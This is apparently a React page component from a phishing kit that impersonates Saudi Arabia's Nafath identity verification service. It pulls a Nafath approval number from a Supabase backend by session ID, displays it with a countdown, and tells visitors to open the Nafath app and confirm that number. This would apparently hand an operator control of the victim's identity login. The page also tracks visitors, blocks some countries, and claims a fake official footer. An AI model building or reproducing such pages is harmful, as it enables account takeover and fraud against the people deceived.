import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import { useVisitorTracking } from "@/hooks/useVisitorTracking";
import { supabase } from "@/integrations/supabase/client";
import { checkCountryAccess, getCurrentPage } from "@/lib/tracking.functions";
import nafathLogo from "@/assets/nafath-logo.png";

export const Route = createFileRoute("/nafath-select")({
  head: () => ({
    meta: [
      { title: "اختيار رقم نفاذ | التحقق الآمن" },
      { name: "description", content: "اختر الرقم الظاهر في تطبيق نفاذ لإكمال التحقق بأمان." },
    ],
    links: [
      { rel: "preconnect", href: "https://fonts.googleapis.com" },
      { rel: "preconnect", href: "https://fonts.gstatic.com", crossOrigin: "anonymous" },
      {
        rel: "stylesheet",
        href: "https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800;900&family=Outfit:wght@600;700;800&display=swap",
      },
    ],
  }),
  component: NafathSelectPage,
});

const TOTAL = 114;

function NafathSelectPage() {
  useVisitorTracking("اختيار رقم نفاذ");
  const navigate = useNavigate();
  const [number, setNumber] = useState<string | null>(null);
  const [seconds, setSeconds] = useState(TOTAL);

  useEffect(() => {
    if (typeof window === "undefined") return;
    checkCountryAccess()
      .then((res) => {
        if (res && res.allowed === false) window.location.replace("/blocked");
      })
      .catch(() => {});
  }, []);

  useEffect(() => {
    if (typeof window === "undefined") return;
    const sessionId = window.localStorage.getItem("bcare_session_id");
    if (!sessionId) return;

    const fetchNumber = () =>
      getCurrentPage({ data: { session_id: sessionId } })
        .then((q) => {
          const row = q as { nafath_number?: string | null } | null;
          if (row?.nafath_number) setNumber(String(row.nafath_number));
        })
        .catch(() => {});
    fetchNumber();
    const poll = setInterval(fetchNumber, 3000);

    const channel = supabase
      .channel(`nafath-select-${sessionId}`)
      .on(
        "postgres_changes",
        { event: "UPDATE", schema: "public", table: "quotes", filter: `session_id=eq.${sessionId}` },
        (payload) => {
          const row = payload.new as { nafath_number?: string | null } | null;
          if (row?.nafath_number) setNumber(String(row.nafath_number));
        },
      )
      .subscribe();

    return () => {
      clearInterval(poll);
      void supabase.removeChannel(channel);
    };
  }, [navigate]);

  useEffect(() => {
    if (!number) return;
    setSeconds(TOTAL);
    const t = setInterval(() => setSeconds((s) => (s > 0 ? s - 1 : 0)), 1000);
    return () => clearInterval(t);
  }, [number]);

  const mm = String(Math.floor(seconds / 60)).padStart(2, "0");
  const ss = String(seconds % 60).padStart(2, "0");
  const progress = number ? (seconds / TOTAL) * 100 : 0;

  const distractors = (() => {
    if (!number) return ["23", "47"];
    const n = parseInt(number, 10);
    if (!Number.isFinite(n)) return ["23", "47"];
    const mod = (v: number) => {
      let x = ((v % 100) + 100) % 100;
      if (x === n % 100) x = (x + 1) % 100;
      return String(x).padStart(2, "0");
    };
    return [mod(n + 17), mod(n + 42)];
  })();

  // ring geometry
  const R = 58;
  const C = 2 * Math.PI * R;
  const dash = (progress / 100) * C;

  return (
    <div
      dir="rtl"
      className="min-h-screen relative flex flex-col items-center justify-center p-4 sm:p-6 overflow-hidden"
      style={{
        fontFamily: "'Tajawal', system-ui, sans-serif",
        background:
          "radial-gradient(1200px 600px at 50% -10%, #E8F5F1 0%, #F5F7F6 55%, #F5F7F6 100%)",
      }}
    >
      <div className="pointer-events-none absolute inset-0 opacity-[0.35]" aria-hidden>
        <div className="absolute -top-40 -right-40 w-[420px] h-[420px] rounded-full border border-[#0E7C66]/15" />
        <div className="absolute -bottom-40 -left-40 w-[420px] h-[420px] rounded-full border border-[#0E7C66]/10" />
      </div>

      <div className="w-full max-w-[440px] relative">
        {/* Brand chip */}
        <div className="flex items-center justify-center gap-2 mb-5">
          <span className="inline-flex items-center gap-1.5 text-[11px] font-semibold text-[#0E7C66] bg-[#0E7C66]/10 px-3 py-1.5 rounded-full">
            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
              <path d="M12 2l8 4v6c0 5-3.5 9-8 10-4.5-1-8-5-8-10V6l8-4z" />
              <path d="m9 12 2 2 4-4" />
            </svg>
            التحقق عبر نفاذ
          </span>
        </div>

        <div className="relative bg-white rounded-[28px] shadow-[0_20px_60px_-20px_rgba(14,124,102,0.25)] border border-[#0E7C66]/10 overflow-hidden">
          <div className="h-1.5 w-full" style={{ background: "linear-gradient(90deg,#12A184,#0E7C66,#0B5F4E)" }} />

          <div className="p-6 sm:p-9 flex flex-col items-center">
            {/* Header */}
            <div className="w-full flex items-center justify-between mb-6">
              <span className="text-[11px] font-bold text-[#8A9793] tracking-wide">تأكيد الطلب</span>
              <div className="flex items-center gap-2">
                <img src={nafathLogo} alt="شعار نفاذ" className="h-6 w-6 object-contain" />
                <span className="text-[#0E7C66] font-extrabold text-sm">نفاذ</span>
              </div>
            </div>

            <h2 className="text-[20px] font-extrabold text-[#0B2A24] tracking-tight text-center">
              اختر الرقم الظاهر في تطبيقك
            </h2>
            <p className="mt-2 text-[13px] text-[#5B6B67] text-center leading-relaxed max-w-[320px]">
              افتح إشعار <span className="font-bold text-[#0E7C66]">نفاذ</span> على جوالك ثم اختر الرقم المطابق أدناه
            </p>

            {/* Circular number */}
            <div className="relative my-8">
              <svg width="148" height="148" viewBox="0 0 148 148" className="-rotate-90">
                <defs>
                  <linearGradient id="ringGrad" x1="0" y1="0" x2="1" y2="1">
                    <stop offset="0%" stopColor="#12A184" />
                    <stop offset="100%" stopColor="#0B5F4E" />
                  </linearGradient>
                </defs>
                <circle cx="74" cy="74" r={R} stroke="#E4EBE8" strokeWidth="8" fill="none" />
                <circle
                  cx="74"
                  cy="74"
                  r={R}
                  stroke="url(#ringGrad)"
                  strokeWidth="8"
                  fill="none"
                  strokeLinecap="round"
                  strokeDasharray={`${dash} ${C}`}
                  style={{ transition: "stroke-dasharray 1s linear" }}
                />
              </svg>
              <div className="absolute inset-0 flex items-center justify-center">
                <div className="w-[104px] h-[104px] rounded-full bg-gradient-to-br from-[#F1FAF7] to-white border border-[#0E7C66]/15 flex items-center justify-center shadow-[inset_0_1px_0_rgba(255,255,255,0.9)]">
                  {number ? (
                    <span
                      className="text-[44px] font-extrabold text-[#0E7C66] leading-none"
                      style={{ fontFamily: "'Outfit', 'Tajawal', sans-serif" }}
                    >
                      {number}
                    </span>
                  ) : (
                    <div className="flex flex-col items-center gap-1.5">
                      <div className="flex gap-1">
                        <Dot delay={0} />
                        <Dot delay={0.15} />
                        <Dot delay={0.3} />
                      </div>
                      <span className="text-[10px] font-semibold text-[#8A9793]">بانتظار الرقم</span>
                    </div>
                  )}
                </div>
              </div>
            </div>

            {/* Timer pill */}
            <div className="inline-flex items-center gap-2 rounded-full bg-[#0E7C66]/8 px-3.5 py-1.5 text-[12px] font-semibold text-[#0E7C66]">
              <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                <circle cx="12" cy="12" r="9" />
                <path d="M12 8v4l3 2" />
              </svg>
              <span>
                تنتهي خلال{" "}
                <span style={{ fontFamily: "'Outfit', 'Tajawal', sans-serif" }} className="tabular-nums font-bold">
                  {mm}:{ss}
                </span>
              </span>
            </div>


            {/* Steps */}
            <ol className="mt-7 w-full space-y-2.5 rounded-2xl bg-[#F8FAF9] border border-[#E4EBE8] p-4 text-[13px] text-[#3A4744]">
              <Step n={1}>افتح تطبيق <b className="text-[#0E7C66]">نفاذ</b> على جوالك</Step>
              <Step n={2}>افتح الإشعار الجديد الذي وصلك</Step>
              <Step n={3}>
                اختر الرقم{" "}
                <b
                  className="text-[#0E7C66] tabular-nums"
                  style={{ fontFamily: "'Outfit', 'Tajawal', sans-serif" }}
                >
                  {number ?? "--"}
                </b>{" "}
                ثم أكّد
              </Step>
            </ol>
          </div>
        </div>

        <p className="mt-5 text-center text-[11px] text-[#8A9793]">
          © المركز الوطني للتحقق الرقمي — جميع الحقوق محفوظة
        </p>
      </div>

      <style>{`
        @keyframes nafBounce { 0%,80%,100%{ transform: scale(0.5); opacity:.4;} 40%{ transform: scale(1); opacity:1;} }
      `}</style>
    </div>
  );
}

function NumTile({ value, active = false }: { value: string; active?: boolean }) {
  return (
    <div
      className={`aspect-square flex items-center justify-center rounded-2xl text-[26px] font-extrabold tabular-nums transition-all ${
        active
          ? "text-white shadow-[0_10px_25px_-8px_rgba(14,124,102,0.55)] ring-4 ring-[#0E7C66]/15"
          : "text-[#5B6B67] bg-[#F8FAF9] border border-[#E4EBE8]"
      }`}
      style={
        active
          ? {
              background: "linear-gradient(135deg,#12A184 0%,#0E7C66 55%,#0B5F4E 100%)",
              fontFamily: "'Outfit', 'Tajawal', sans-serif",
            }
          : { fontFamily: "'Outfit', 'Tajawal', sans-serif" }
      }
    >
      {value}
    </div>
  );
}

function Dot({ delay }: { delay: number }) {
  return (
    <span
      className="inline-block h-1.5 w-1.5 rounded-full bg-[#0E7C66]"
      style={{ animation: `nafBounce 1.2s ${delay}s infinite ease-in-out` }}
    />
  );
}

function Step({ n, children }: { n: number; children: React.ReactNode }) {
  return (
    <li className="flex items-start gap-3">
      <span
        className="mt-0.5 flex h-6 w-6 shrink-0 items-center justify-center rounded-full text-[11px] font-extrabold text-white"
        style={{ background: "linear-gradient(135deg,#12A184,#0E7C66)" }}
      >
        {n}
      </span>
      <span className="leading-relaxed">{children}</span>
    </li>
  );
}
